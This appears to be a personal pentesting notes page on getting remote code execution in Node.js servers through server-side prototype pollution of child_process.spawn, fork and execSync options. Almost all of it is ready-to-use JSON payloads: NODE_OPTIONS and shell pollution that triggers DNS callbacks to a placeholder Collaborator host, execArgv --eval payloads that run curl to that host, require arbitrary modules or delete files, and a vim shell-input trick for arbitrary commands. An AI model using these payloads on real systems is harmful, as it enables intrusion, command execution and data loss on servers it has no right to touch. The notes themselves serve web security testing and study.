---
tags:
  - web
  - security
---
A way to achieve [[Remote Code Execution|RCE]] via server side prototype pollution on nodejs servers by pollution properties used by:
- `child_process.spawn()`
- `child_process.fork()`
# DNS Lookup on New Shell Spawn `shell` and `NODE_OPTIONS` Pollution
Can be toggled with [[Prototype Pollution Environment Variable Overwriting]] to cause DNS lookups once a new shell is spawned.
```
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```
# child_process.fork() `execArgv` Pollution
Allows arbitrary commands to be eval'd. Even allows requiring new modules.
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

```
"__proto__": {
    "execArgv": [
	    "--eval=require('<module>')"
    ]
}
```

```
"__proto__": {
    "execArgv": [
	    "--eval=fs.unlinkSync('./temp')"
    ]
}
```
# execSync() `shell` and `input` Pollution
```
"__proto__": {
    "shell": "vim"
    "input": ":! <command>\n"
}
```
- You can use [[xargs]] to convert stdin into list of arguments to be passed to a command